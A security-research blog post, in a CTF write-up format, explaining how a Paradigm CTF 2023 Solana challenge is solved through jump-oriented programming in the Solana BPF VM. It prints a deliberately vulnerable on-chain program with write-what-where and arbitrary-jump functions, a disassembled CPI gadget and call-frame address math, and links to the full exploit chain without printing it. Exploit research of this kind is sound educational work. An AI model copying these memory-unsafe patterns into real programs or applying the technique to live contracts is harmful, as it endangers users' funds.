# [H] OtterSec: Solana: jumping around in the VM

## Summary
Severity: High
Published: Mon, 11 Dec 2023
Source: https://osec.io/blog/jumping-around-in-the-vm/
Type: security-research

## Details
## Solana: jumping around in the VM

 Nicola Vella , Robert Chen Dec 11, 2023 An exploration of low-level Solana VM behavior. How to escalate from a powerful memory corruption primitive to full program control.

## Introduction 

 In the world of CTFs, Paradigm CTF 2023 was like no other. Presenting a unique Solana challenge, the goal was to leverage Jump Oriented Programming, a web2 binary exploitation technique, inside the Solana VM to achieve arbitrary CPI execution.

 To succeed in this challenge, a strong understanding of the Solana VM is required. Weâve explored parts of the Solana VM internals in two previous blog posts: Solana: An Auditorâs Introduction and Reverse Engineering Solana with Binary Ninja .

 In this comprehensive overview, weâll break down critical components of the Solana BPF VM necessary to write a complete memory-corruption exploit. We then turn an arbitrary function call and memory write primitive into a full exploit.

## Overview 

 The challenge itself resides in 
```
framework/
```
, and is composed of two parts:

- 
```
framework/chall/lib.rs
```
: The on-chain eBPF program that needs to be exploited.

- 
```
framework/src/main.rs
```
: Program that sets up a Solana test environment, gets a single instruction and makes it possible for users to interact with the on-chain program.

## Vulnerable program 

 The program is simple: it parses the input data and does something based on the first byte. Each potential action is quite out of the ordinary though:

- 
 If 
```
 data [ 0 ] == 0 
```
, a function that lets you write-what-where is executed:

 lib.rs 
```

```
 1

 #[ inline ( never )] 

 2

 pub fn write ( data : &[ u8 ]) { 

 3

 unsafe { 

 4

 let ptr = std :: mem :: transmute ::<[ u8 ; 8 ], * mut u64 >( data [.. 8 ]. try_into (). unwrap ()); 

 5

 let val = std :: mem :: transmute ::<[ u8 ; 8 ], u64 >( data [ 8 .. 16 ]. try_into (). unwrap ()); 

 6

 ptr . write_volatile ( val ); 

 7

 } 

 8

 } 

```

```

 (data[..8].try_into().unwrap()); let val = std::mem::transmute:: (data[8..16].try_into().unwrap()); ptr.write_volatile(val); }}"> 

- 
 If 
```
 data [ 0 ] == 1 
```
, a CPI to a non-existent program is executed:

 lib.rs 
```

```
 1

 #[ inline ( never )] 

 2

 pub fn call ( data : &[ u8 ]) { 

 3

 let ix = Instruction { 

 4

 program_id : pubkey! ( "osecio5555555555555551111111111111111111111" ), 

 5

 data : data . try_into (). unwrap (), 

 6

 accounts : vec! [] 

 7

 }; 

 8

 9

 invoke_signed_unchecked ( 

 10

 & ix , 

 11

 &[], 

 12

 &[], 

 13

 ). unwrap (); 

 14

 } 

```

```

- 
 Finally, if 
```
 data [ 0 ] 
```
 is neither 0 nor 1, a function that lets you jump to an arbitrary address, passing an arbitrary value as the first parameter is executed:

 lib.rs 
```

```
 1

 #[ inline ( never )] 

 2

 pub fn process ( mut data : &[ u8 ]) { 

 3

 unsafe { 

 4

 let ptr = std :: mem :: transmute ::<[ u8 ; 8 ], fn ( u64 )>( data [.. 8 ]. try_into (). unwrap ()); 

 5

 let val = std :: mem :: transmute ::<[ u8 ; 8 ], u64 >( data [ 8 .. 16 ]. try_into (). unwrap ()); 

 6

 ptr ( val ); 

 7

 8

 data = & data [ 16 ..]; 

 9

 10

 let ptr = std :: mem :: transmute ::<[ u8 ; 8 ], fn ( u64 )>( data [.. 8 ]. try_into (). unwrap ()); 

 11

 let val = std :: mem :: transmute ::<[ u8 ; 8 ], u64 >( data [ 8 .. 16 ]. try_into (). unwrap ()); 

 12

 ptr ( val ); 

 13

 } 

 14

 } 

```

```

 (data[..8].try_into().unwrap()); let val = std::mem::transmute:: (data[8..16].try_into().unwrap()); ptr(val); data = &data[16..]; let ptr = std::mem::transmute:: (data[..8].try_into().unwrap()); let val = std::mem::transmute:: (data[8..16].try_into().unwrap()); ptr(val); }}"> 

## Test environment 

 To understand our capabilities regarding interaction with the program and determine what is necessary to get the flag, we must analyze the test environment.

 When you connect to the server through a TCP connection, 
```
framework/src/main.rs::handle_connection
```
 gets executed, which does the following:

- 
 Creates a new Solana local node:

 main.rs 
```

```
 let mut builder = ChallengeBuilder :: try_from ( socket . try_clone (). unwrap ()). unwrap (); 

 assert! ( builder . add_program ( "/path/to/chall.so" , Some ( chall :: ID )) == chall :: ID ); 

 let mut chall = builder . build (). await ; 

```

```

- 
 Funds the user account with 100 SOL:

 main.rs 
```

```
 1

 let user_keypair = Keypair :: new (); 

 2

 let user = user_keypair . pubkey (); 

 3

 4

 let payer_keypair = & chall . ctx . payer ; 

 5

 let payer = payer_keypair . pubkey (); 

 6

 7

 chall 

 8

 . run_ix ( system_instruction :: transfer (& payer , & user , 100_000_000_000 )) 

 9

 . await ?; 

 10

 11

 writeln! ( socket , "user: {} " , user )?; 

```

```

- 
 Reads an instruction from the TCP stream and executes it:

 main.rs 
```

```
 let solve_ix = chall . read_instruction ( chall :: ID )?; 

 chall . run_ixs_full (&[ solve_ix ], &[& user_keypair ], & user ). await ?; 

```

```

- 
 Checks that the account at PDA(âFLAGâ) exists, has a data length of 0x1337 and the first 8 bytes are equal to 0x4337. If so, it prints the flag:

 main.rs 
```

```
 1

 let flag = Pubkey :: create_program_address (&[ "FLAG" . as_ref ()], & chall :: ID )?; 

 2

 if let Some ( acct ) = chall . ctx . banks_client . get_account ( flag ). await ? { 

 3

 if acct . data . len () == 0x1337 

 4

 && u64 :: from_le_bytes ( acct . data [.. 8 ]. try_into (). unwrap ()) == 0x4337 

 5

 { 

 6

 writeln! ( socket , "congrats!" )?; 

 7

 if let Ok ( flag ) = env :: var ( "FLAG" ) { 

 8

 writeln! ( socket , "flag: { :? } " , flag )?; 

 9

 } else { 

 10

 writeln! ( socket , "flag not found, please contact admin" )?; 

 11

 } 

 12

 } 

 13

 } 

```

```

## Solution idea 

 You may think itâs impossible to do with just one instruction, but we can actually leverage the 
```
 process () 
```
 function to execute infinite instructions. 1 

 In order to get the flag, we need to make sure that the account at 
```
PDA("FLAG")
```
 exists, has a data length of 0x1337, and the first 8 bytes are equal to 0x4337.

 Essentially, we need to invoke the System Program , and write controlled data into the newly created account.

 A sample program that does this is as follows:

```

```
 1

 pub fn process_instruction ( 

 2

 program_id : & Pubkey , 

 3

 accounts : &[ AccountInfo ], 

 4

 data : &[ u8 ] 

 5

 ) -> ProgramResult { 

 6

 let flag_pda_ai = & accounts [ 0 ]; 

 7

 let user_ai = & accounts [ 1 ]; 

 8

 9

 // Step 1: Create a new account with 0x1337 bytes of data 

 10

 let instruction = Instruction :: new_with_bincode ( 

 11

 system_program :: ID , 

 12

 & SystemInstruction :: CreateAccount { 

 13

 space : 0x1337 , 

 14

 lamports : Rent :: default (). minimum_balance ( 0x1337 ), 

 15

 owner : chall :: ID 

 16

 }, 

 17

 vec! [ 

 18

 AccountMeta :: new (* user_ai . key , true ), 

 19

 AccountMeta :: new (* flag_pda_ai . key , true ), 

 20

 ], 

 21

 ); 

 22

 invoke_signed_unchecked ( 

 23

 & instruction , 

 24

 &[ 

 25

 user_ai . clone (), 

 26

 flag_pda_ai . clone (), 

 27

 ], 

 28

 &[&[ "FLAG" . as_ref ()]], 

 29

 )?; 

 30

 31

 // Step 2: Write 0x4337 to the first 8 bytes of the account 

 32

 flag_pda_ai . try_borrow_mut_data ()?[.. 8 ]. copy_from_slice (& 0x4337 u64 . to_le_bytes ()); 

 33

 34

 Ok (()) 

 35

 } 

```

```

 ProgramResult { let flag_pda_ai = &accounts[0]; let user_ai = &accounts[1]; // Step 1: Create a new account with 0x1337 bytes of data let instruction = Instruction::new_with_bincode( system_program::ID, &SystemInstruction::CreateAccount { space: 0x1337, lamports: Rent::default().minimum_balance(0x1337), owner: chall::ID }, vec![ AccountMeta::new(*user_ai.key, true), AccountMeta::new(*flag_pda_ai.key, true), ], ); invoke_signed_unchecked( &instruction, &[ user_ai.clone(), flag_pda_ai.clone(), ], &[&["FLAG".as_ref()]], )?; // Step 2: Write 0x4337 to the first 8 bytes of the account flag_pda_ai.try_borrow_mut_data()?[..8].copy_from_slice(&0x4337u64.to_le_bytes()); Ok(())}"> 

 To test this theory, we can execute the program above inside the test environment, and see if we can get the flag:

 It works! Now we âjustâ need to find a way to execute the program above, by leveraging the single Instruction call to the program. This is easier said than done. The next section will dive into the details of the Solana VM to understand how we can achieve this.

## Solution implementation 

 Now that we know what we need to do, letâs look at how we can actually do it. We have to code the above program, by chaining together multiple 
```
 process () 
```
 invocations:

 What are those gadgets? The Solana VM does not enforce that the target of a jump is a valid one, meaning that itâs possible to jump to arbitrary addresses!

 To mimic the execution of our solution, we need a gadget that lets us CPI into system_program, with parameters we control. How do we obtain those? We can use Binary Ninja to find a suitable gadget for this.

 Tip Before throwing the on-chain program to binja, itâs useful to find a way to get symbols for it. One solution is to patch the 
```
 cargo-build-sbf 
```
 command to skip the strip pass .

## CPI gadget 

 Looking at the program source, one idea is to look for the CPI gadget around the 
```
 call () 
```
 function. This function calls into the Solana SDKâs function invoke_signed_unchecked , yielding a powerful gadget at the address 
```
0x100001ba8
```
:

```

```
 solana_program::program::invoke_signed_unchecked 

 100001ba8 79a278ff00000000 ldxdw r2, [r10-136] {var_88} 

 100001bb0 79a380ff00000000 ldxdw r3, [r10-128] {var_80} 

 100001bb8 79a468ff00000000 ldxdw r4, [r10-152] {var_98} 

 100001bc0 79a570ff00000000 ldxdw r5, [r10-144] {var_90} 

 100001bc8 8520000020100000 call sol_invoke_signed_rust 

 100001bd0 5500040000000000 jne <+4> r0, 0x0 

 100001bd8 b701000018000000 mov r1, 0x18 

 100001be0 79a288ff00000000 ldxdw r2, [r10-120] {var_78} 

 100001be8 6312000000000000 stxw [r2-0], r1 {0x18} 

 100001bf0 0500030000000000 ja <+3> 

 100001bf8 79a188ff00000000 ldxdw r1, [r10-120] {var_78} 

 100001c00 bf02000000000000 mov r2, r0 

 100001c08 8510000075000000 call _ZN94_$LT$solana_program...$u64$GT$$GT$4from17ha0d289b72861b06dE 

 100001c10 79a2b8ff00000000 ldxdw r2, [r10-72] {var_48} 

 100001c18 1502040000000000 jeq <+4> r2, 0x0 

 100001c20 2702000022000000 mul r2, 0x22 

 100001c28 79a1b0ff00000000 ldxdw r1, [r10-80] {var_50} 

 100001c30 b703000001000000 mov r3, 0x1 

 100001c38 8510000003feffff call __rust_dealloc 

 100001c40 79a2d0ff00000000 ldxdw r2, [r10-48] {var_30} 

 100001c48 1502030000000000 jeq <+3> r2, 0x0 

 100001c50 79a1c8ff00000000 ldxdw r1, [r10-56] {var_38} 

 100001c58 b703000001000000 mov r3, 0x1 

 100001c60 85100000fefdffff call __rust_dealloc 

 100001c68 9500000000000000 exit {__return_addr} 

```

```

 r0, 0x0100001bd8 b701000018000000 mov r1, 0x18100001be0 79a288ff00000000 ldxdw r2, [r10-120] {var_78}100001be8 6312000000000000 stxw [r2-0], r1 {0x18}100001bf0 0500030000000000 ja 100001bf8 79a188ff00000000 ldxdw r1, [r10-120] {var_78}100001c00 bf02000000000000 mov r2, r0100001c08 8510000075000000 call _ZN94_$LT$solana_program...$u64$GT$$GT$4from17ha0d289b72861b06dE100001c10 79a2b8ff00000000 ldxdw r2, [r10-72] {var_48}100001c18 1502040000000000 jeq r2, 0x0100001c20 2702000022000000 mul r2, 0x22100001c28 79a1b0ff00000000 ldxdw r1, [r10-80] {var_50}100001c30 b703000001000000 mov r3, 0x1100001c38 8510000003feffff call __rust_dealloc100001c40 79a2d0ff00000000 ldxdw r2, [r10-48] {var_30}100001c48 1502030000000000 jeq r2, 0x0100001c50 79a1c8ff00000000 ldxdw r1, [r10-56] {var_38}100001c58 b703000001000000 mov r3, 0x1100001c60 85100000fefdffff call __rust_dealloc100001c68 9500000000000000 exit {__return_addr}"> 

 Which, assuming that 
```
 sol_invoke_signed_rust () 
```
 returns 0, is doing the following:

- 
```
sol_invoke_signed_rust(r1, [r10-136], [r10-128], [r10-152], [r10-144])
```

- 
```
*[r10-120] = 0x18
```

- Calls 
```
 __rust_dealloc () 
```
, which in default circumstances is a NOP .

 r10 is the stack pointer, so it will point to the stack frame of the current depth when executing that instruction.

 If we correctly set up the stack frame used by this gadget with valid parameters, thatâs a win.

 Looking at the definition , itâs not crystal clear what the parameters are:

 definitions.rs 
```

```
 fn sol_invoke_signed_rust ( instruction_addr : * const u8 , account_infos_addr : * const u8 , account_infos_len : u64 , signers_seeds_addr : * const u8 , signers_seeds_len : u64 ) -> u64 

```

```

 u64"> 

 The source of invoke_signed_unchecked helps a lot, but looking at the actual implementation provides more clarity:

- 
```
instruction_addr
```
 points to a StableInstruction :

- 
```
account_infos_addr
```
 points to a slice of 
```
account_infos_len
```
 AccountInfos .

- 
```
signers_seeds_addr
```
Â is a bit trickier â it points to a slice of length 
```
signers_seeds_len
```
, containing slices of 
```
 u8 
```
:

 Where do we store those fake parameters? We can store them directly inside the input data, and just write the pointers to them on the stack through the write gadget. Note that these writes are to future call frames .

 Now that we have all the parts, all we need is to string it together. The full reference solution can be found here .

 Hereâs a visualization of the final JOP chain:

 Note 
```
target_r10
```
 is the address of the call frame when the CPI gadget is invoked, which, as shown in the graph, is the 8th frame. Its address can be calculated as follows:

```

```
 fn call_frame_addr ( depth : u64 ) -> u64 { 

 0x200000000 + 0x2000 * depth + 0x1000 

 } 

 // call_frame_addr(8) = 0x200011000 

```

```

 u64 { 0x200000000 + 0x2000 * depth + 0x1000}// call_frame_addr(8) = 0x200011000"> 

## Conclusion 

 Most blockchain vulnerabilities are high-level business logic bugs. While low-level Solana bugs are rare, they do exist .

 In this blog post, we provided an exploration of the exploitation side of security. Thereâs a surprising amount of work necessary to go from powerful memory corruption primitives to full control of the program.

 Security requires a top-to-bottom understanding of the execution environment. We hope this challenge and blog post motivate others to understand the entire runtime.

## Footnotes 

- 
 Not entirely infinite, as we are limited by the amount of data we can pass to the on-chain program, and by the maximum stack depth of the Solana VM â but we can execute up to 64 instructions, which is more than enough to get the flag. â©
